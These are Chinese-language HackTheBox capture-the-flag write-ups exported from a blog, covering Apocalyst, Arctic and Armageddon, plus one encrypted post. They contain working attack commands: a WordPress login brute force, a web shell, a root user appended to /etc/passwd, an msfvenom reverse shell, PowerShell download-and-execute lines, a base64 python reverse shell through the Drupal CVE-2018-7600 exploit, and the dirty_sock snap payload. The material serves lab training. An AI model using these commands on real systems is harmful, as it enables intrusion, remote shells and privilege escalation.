    <title>HTB:Apocalyst</title>
    <url>/2020/10/21/HTB-Apocalyst/</url>
    <content><![CDATA[<h1 id="Apocalyst"><a href="#Apocalyst" class="headerlink" title="Apocalyst"></a>Apocalyst</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>添加hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.46     apocalyst.htb</span><br></pre></td></tr></table></figure>

<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Apocalyst/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80端口运行wordpress</p>
<p><img src="/images/Apocalyst/2.png" alt="2"></p>
<p>目录枚举</p>
<p><img src="/images/Apocalyst/3.png" alt="3"></p>
<p>枚举出了大量页面，不会大小421的页面没有信息</p>
<p><img src="/images/Apocalyst/4.png" alt="4"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>考虑一般wordpress的渗透流程，比如从wpscan开始</p>
<p>用户名枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token xxx --url http:&#x2F;&#x2F;apocalyst.htb --disable-tls-checks --enumerate u</span><br></pre></td></tr></table></figure>

<p><img src="/images/Apocalyst/5.png" alt="5"></p>
<p>插件枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token xxx --url http:&#x2F;&#x2F;apocalyst.htb --disable-tls-checks --enumerate ap --plugins-detection aggressive</span><br></pre></td></tr></table></figure>

<p><img src="/images/Apocalyst/6.png" alt="6"></p>
<p>考虑到主页看上去是一个个人博客，思考一些定制化的攻击方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cewl apocalyst.htb -m 4 -w wordlist.txt -d 5</span><br></pre></td></tr></table></figure>

<p><img src="/images/Apocalyst/7.png" alt="7"></p>
<p>使用它进行目录枚举</p>
<p><img src="/images/Apocalyst/8.png" alt="8"></p>
<p>得到<code>Rightiousness</code>，里面还是那张图，把它下载下来，然后一个无语操作，解决图片隐写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">steghide extract -sf image.jpg</span><br></pre></td></tr></table></figure>

<p><img src="/images/Apocalyst/9.png" alt="9"></p>
<p>之后使用<code>list.txt</code>爆破wordpress</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l falaraki -P list.txt apocalyst.htb -s 80 http-form-post &quot;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log+In&amp;redirect_to&#x3D;http%3A%2F%2Fapocalyst.htb%2Fwp-admin%2F&amp;testcookie&#x3D;1:login_error&quot; -t 64</span><br></pre></td></tr></table></figure>

<p><img src="/images/Apocalyst/10.png" alt="10"></p>
<p>得到<code>falaraki/Transclisiation</code></p>
<p>wordpress后台getshell，这次通过安装插件完成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Web-Shells&#x2F;WordPress&#x2F;plugin-shell.php &#x2F;root&#x2F;Desktop</span><br><span class="line">zip plugin-shell.zip plugin-shell.php</span><br></pre></td></tr></table></figure>

<p>上传成功</p>
<p><img src="/images/Apocalyst/11.png" alt="11"></p>
<p>访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;apocalyst.htb&#x2F;wp-content&#x2F;plugins&#x2F;plugin-shell&#x2F;plugin-shell.php?cmd&#x3D;id</span><br></pre></td></tr></table></figure>

<p><img src="/images/Apocalyst/12.png" alt="12"></p>
<p>得到RCE，这样就能获取shell了</p>
<p><img src="/images/Apocalyst/13.png" alt="13"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Apocalyst/14.png" alt="14"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;suser:$1$000$WGcjZIfxKhymgsHNCg2FQ.:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd</span><br><span class="line">su suser</span><br><span class="line">toor</span><br></pre></td></tr></table></figure>

<p><img src="/images/Apocalyst/15.png" alt="15"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Arctic</title>
    <url>/2020/06/12/HTB-Arctic/</url>
    <content><![CDATA[<h1 id="Arctic"><a href="#Arctic" class="headerlink" title="Arctic"></a>Arctic</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Arctic/1.jpg" alt="1"></p>
<p>端口开放的很奇怪</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Arctic/2.jpg" alt="2"></p>
<p>8500端口是个目录，看看能发现什么</p>
<p><img src="/images/Arctic/3.jpg" alt="3"></p>
<p>发现了coldfusion 8的后台地址</p>
<p>搜寻公开漏洞</p>
<p><img src="/images/Arctic/4.jpg" alt="4"></p>
<p>发现了一个目录遍历</p>
<p><img src="/images/Arctic/5.jpg" alt="5"></p>
<p>利用它可以读取后台密码md5</p>
<p><img src="/images/Arctic/6.jpg" alt="6"></p>
<p>解密后是<code>happyday</code></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p><img src="/images/Arctic/7.jpg" alt="7"></p>
<p>成功找到上传点<br>生成木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.10.16.123 LPORT&#x3D;4444 -f raw -o evil.jsp</span><br></pre></td></tr></table></figure>

<p>不过上传需要填写对端文件和本地保存路径</p>
<p><img src="/images/Arctic/9.jpg" alt="9"></p>
<p>好在可以在<code>mappings</code>里找到</p>
<p><img src="/images/Arctic/8.jpg" alt="8"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\ColdFusion8\wwwroot\CFIDE\evil.jsp</span><br></pre></td></tr></table></figure>

<p>最后要勾上<code>Save output to a file</code></p>
<p><img src="/images/Arctic/10.jpg" alt="10"></p>
<p>之后我们的shell就成功上传了</p>
<p><img src="/images/Arctic/11.jpg" alt="11"></p>
<p><img src="/images/Arctic/12.jpg" alt="12"></p>
<p>成功获取shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>获取powershell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.173&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/Arctic/13.jpg" alt="13"></p>
<p>执行提权脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.173&#x2F;winpriv&#x2F;Sherlock.ps1&#39;);Find-AllVulns</span><br></pre></td></tr></table></figure>

<p><img src="/images/Arctic/14.jpg" alt="14"></p>
<h3 id="ms15-051"><a href="#ms15-051" class="headerlink" title="ms15-051"></a>ms15-051</h3><p><img src="/images/Arctic/15.jpg" alt="15"></p>
<p>提权成功</p>
<h3 id="ms10-059"><a href="#ms10-059" class="headerlink" title="ms10-059"></a>ms10-059</h3><p><img src="/images/Arctic/16.jpg" alt="16"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\Chimichurri.exe 10.10.16.173 5555</span><br></pre></td></tr></table></figure>

<p><img src="/images/Arctic/17.jpg" alt="17"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Armageddon</title>
    <url>/2021/03/30/HTB-Armageddon/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Armageddon/1.png" alt="1"></p>
<p>nmap发现了web应用drupal，并且发现了CHANGELOG.txt文件</p>
<p><img src="/images/Armageddon/2.png" alt="2"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>低版本的drupal容易受到cve-2018-7600的攻击，和HTB的Bastard一样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 drupa7-CVE-2018-7600.py http:&#x2F;&#x2F;10.129.102.130</span><br></pre></td></tr></table></figure>

<p>直接获得RCE</p>
<p><img src="/images/Armageddon/3.png" alt="3"></p>
<p>msf也可以</p>
<p><img src="/images/Armageddon/4.png" alt="4"></p>
<p>机器上存在python没有nc，就用python反弹shell了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 drupa7-CVE-2018-7600.py http:&#x2F;&#x2F;10.129.102.130 -c &quot;echo -n &#39;cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTYuMiIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7Jwo&#x3D;&#39; | base64 -d | sh&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Armageddon/5.png" alt="5"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>由于drupal，所以快速找到mysql密码，位置<code>/var/www/html/sites/default/settings.php</code></p>
<p><img src="/images/Armageddon/6.png" alt="6"></p>
<p>之后在mysql里找到哈希</p>
<p><img src="/images/Armageddon/7.png" alt="7"></p>
<p>破解之后得到 <code>brucetherealadmin/booboo</code></p>
<p><img src="/images/Armageddon/8.png" alt="8"></p>
<p>之后ssh即可</p>
<p><img src="/images/Armageddon/9.png" alt="9"></p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>当前用户sudo，发现snap install命令</p>
<p><img src="/images/Armageddon/10.png" alt="10"></p>
<p>snap版本为2.47.1</p>
<p><img src="/images/Armageddon/11.png" alt="11"></p>
<p>寻找公开漏洞，发现了公开的提权漏洞</p>
<p><img src="/images/Armageddon/12.png" alt="12"></p>
<p>快速查看后，发现dirty_sock漏洞，一个关于snapd api的权限提升漏洞。这里的版本不符，但是我们是以sudo权限执行，阅读blog理解exploit执行流程即可</p>
<p>我们会使用46362.py，因为它不需要外网连接。根据blog所写，我们需要以root执行的程序，我们这里使用sudo就不要考虑了，然后写一个恶意的shell脚本，当snap运行在devmode安装程序时，shell脚本就会被触发，并且运行在UID=0的权限中，也就似乎root</p>
<p>当然不能直接写shell脚本，还需要考虑snap的文件结构，这里可以直接拷贝python里的POC，它们已经由base64编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo -n &#39;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J&#x2F;e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET&#x2F;XVLOZmGVXmojv&#x2F;IHq2fZcc&#x2F;VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA&#x2F;Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x3D;&#x3D;&#39; |base64 -d &gt; evil.snap</span><br></pre></td></tr></table></figure>

<p>删除多余的空格，解码重新输出到文件，注意文件后缀必须为snap</p>
<p><img src="/images/Armageddon/13.png" alt="13"></p>
<p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo &#x2F;usr&#x2F;bin&#x2F;snap install --devmode &#x2F;tmp&#x2F;evil.snap</span><br></pre></td></tr></table></figure>

<p>之后，我们就创建了一个dirty_sock用户，并且具有sudo权限</p>
<p><img src="/images/Armageddon/14.png" alt="14"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Atom</title>
    <url>/2021/04/27/HTB-Atom/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="6ca8e3e87e77ee498a0709dad868fc4242e86992003bf62d413b2267bc3d149d">fc18cff1dac5677a6a2424b6e1454e4c4b11f0763befdfaebeefb273606f0ef21247bcbf73b80d74da2a2649ea5596167d0916841afe4dbbd49ea8ef65c647c58a20408d8da681c1c7bd5370ac7833afff1e3139a514fc66294693799c8bd31dc119eb100dc96336f51733a80ae44ad0a5cb0bacb132841bbc1ecdafe1a1997d9213581314861ff5f0a60570356c9165a560e29276b4736e4560973fb6a093f8b4397c292b40c3c34e281647497cd6783c211050b45c7214eed465f1a9b5cd04b57fc3f9183032915d707c33c88c796cbe6d2efe44de0e09c13ba416de10efaa543047007b75b79979941a6f8ea87b97b51f07e1b41bbd7c5cb111a62aab089e844ebe0ca707345691c7c03dd6f5775b45888513641ab1775a819d6b8d72d9e90a139bc8610d943953eb77dc6a0aae50d42f0eff348f0e90acfdc2a1b3d0f0fe07f200fb7b38e0e5fa96a5bcd0a8d522d0d0ebfada14fdb3fb8e3466c91a1ccf06f0f36a15ae5afd007434ad2936679e0511ddcfc82e769eb40262a4610081600cb7d11ecb2a656a9b50905279b5898fd779e291c0e496bd96f3ff0679adc9a20ccce1f5a08e05baef5ac5bc22333d232a3eae717c7be440b8133ebcc8b810c1f760e01cd1a592d46fff61a0f06c6119b8dbe69caa8692102c6d773506a302b0c7d299c3c4f5eb6fbec37126a83079e7e94636272c5b3971b2e9cebd7c0005ea2a22df82363f633e5de14bf208a969f7f3d76f6eb68296819f65a4cb48919c84bf3e5979f9e0d3f5c6e3cf16d273f5af4828c83ba5e92db704429f53e8051cedbaa6d9274e34018fc3cf08dbe4322b5d7a36d20fc7e898eba294508e35a0b2aac5978e9910781125e873664fde7b2e4a8661295f31c1f7cad252e0d4686ba8642818355850c36267dadcaa5091cdbba43aba0e4ad6dbf6482df0f2f08e8c8c2b463200d61e08c7c7b3a26e5c86f47040bc5478e473e91118c5e6a9ac179da3046b716d2cc8e8e669b75316fc7e6f806acb1b3efac5106b89803aa896f8599b5bba46b9841a458e857cbded6b9f4c57d248f6561285434fe1d33666228e11c43f71c3f6ef82acc3549193b9ec31ce974073dccdfe376fd0baed57e85b88e75363236dd1710bbce2be48af201beb21d8d44974b3b5292a82c8617aed3b386ae476516ecac4b79c216fc27f612072f0585fd7970cd0a0bc35928dade300584680a00bfd57e1c0ea8c2f51e71f7cd25109705e0c1b2aecdb82f4edd8086a0ea42068a479aa37f8ae016cd4fcbbe0c676f81fda77ff0d8175283ccce17d8a775ed7f7fd77f431ec49e779919588d429c67d408833d654bbae96deddf8c1c8b2b6cc1442c64435092251fcf04793173ede0622b9bfa3eac57812061c852789b6215776730fbc18b97198baec22575c02a5ceb6ae2abcaea2bf4e3bcd6383980ceb0db927cd1b1241e28108517da0ae226734686937dcac3fcb49bedba97681de1e7646108fc51be93b3557e33fbc4c4a330fe784327e2ae45f6a582185e1ca2d1d8884739023bde49fd4065501b629404b589f46ee021f036b34dcaf3dfc38d370bd7f7442859074fc751ff49f9e9e76b1d364bae97c675d16855122206c91f2fbe3b36e0e9d3903c84f4c7cf88f77627bda1782d390c133fe2fddd761b63fbbade8d96b480178c4821bcde7a95673579b73a0d48bbb2ae47da914b753a8f6d7409d1579f59899c5967bad01a55883e4e50454e74cf7e4ededefb13ff6eb1611ba0862a211f487453750927c44754abc9aa8fff6820602a821d6858b40a54fb50ce9ef33ab30bd91c29c389c40624801c11789e66b2f24be6fcbf4dd51740b7bd683b1b0bd3c12cca42f12753689cf3c94e148ce8c94a982b82128dcde6f1f66e2b2119fd78d6c3d2bb7744b27fc8cf193b9de86840afaca5d77c00f2fdc7c8aa0b8a00dc3e6fb8eb5768000af0910b0ffb1d26293497f1a6404bb34eeb3104c1fd817bc34cd373316b02ccc5c1b54d4d21283d6177c683704c34b641a5617cc1cf6975d028d32de52affa6c46e8b3fcb841b0271d2129f26aa88e0e8e306b44f18f15e7c891b830423afc069c15731ca1c9a26d6e9ccb1ab384bf0734be57d0047687f7d18be97ce8ec0dfc5c3fd233673a6a7f050a0955b95a8fa62f10ba69f68800293aa4653ab436f74925d5eba23ecd3e46c9106b949d2912f789f2cf8bd338dcc344d7dd4bad0f43d8187004250edf581c4c6db7e45b9da477dd73344295c32a29525cbd868d0b00ef231f212ed24c2da7f5f877eb3255abde571ec8a685ccc81917b4c09e427e69609a92138d4f00727093b25d572a151ec8062596389e78caf36ad0ea6a2a4e8dce1a272bd85b6a02707a709ff0093117200edf365b8ee70e7dcc5f73b3410ae4a535a691c7cf0d68b476ef6c80957caeb35979a6e7c52298cfe2c7b9b77be79e787ac3ebc557db8d918e22d890063ecbff67f0da91cd5b084d5bd0d8e995824ee6c767682f385069310ba6b66ca479bb973ffb3be907a1ce8bca8c4c53196b8ae780835bade153b6d33a3a7b328de385eb30d09e6e62f1dbe56744797d370fbe4d6a45d211216e717a0d9856acefbc786d674e8888b1f8f2fed7a886a4f3b70f464112ed0041eabc9ceaf808bd550928a8d5bd5e33caf727b7cb10ccdb462ab186457758f2f4d8551a1ad68add8d54b685c4eb70209889a497e4c7ea7ecdffccb374d7e25adb2893551a3525aa3fc1c74e109d85a9d295bd201880e28b207893a6b103cbf66924786d6770acd72d22041ea514e3a0d047152011e2b2641f2f7efaeeecf2855abb402a5fc53f10e6e2e30f80b863f33cadd4d321b4e3c099dcfe0afd4a2ecd4da0387ee502c3e140a5d4f87f9d7a490d221396b596b3de53d297a7e0f720b1e7e1d2a9a7c7ff1ef7db8cd3036d74ed467cae759f82df7d7cf042a2daedffda3175d5f2fe664e61a58ef2119f551cc51f41cffe570e0e371ae1b570ecb142f09e1eeb86a8536d3d824951f7a4885a3a13b1cb17a9fe5933e5417f280525eacb1f87dfb4926cbb0598160fafdc8439cdd2ec0ac76cefe6cecc53abdff57542d3125dbd669665601dd265283f51a85c5f0a0ec964da21ce51133c35e9b338f79ba8ae58063b91a0fe47fd65aab2763c02f8e29e1f04364aa61765f976b033c2dbebdbeff17c5bab62529052d0dc853d54a136e567d3301677ba9b2c7a873a2812589497c04101abdce9bcf645b0644114f39559aadfb5d78e036b544a3cf0ba5aaa11ac158a871ba97ae0b629800f17c38b91a68f2d82ba021b4e6fa4aad3a65b92931718ceae27f0b1f425c6b9e485af23f537080b2e8e6082f6dea0732a3ff4407df9c49a2df946b688e3a2ac3bbcd6b55c1d60c70a5bc7ccaa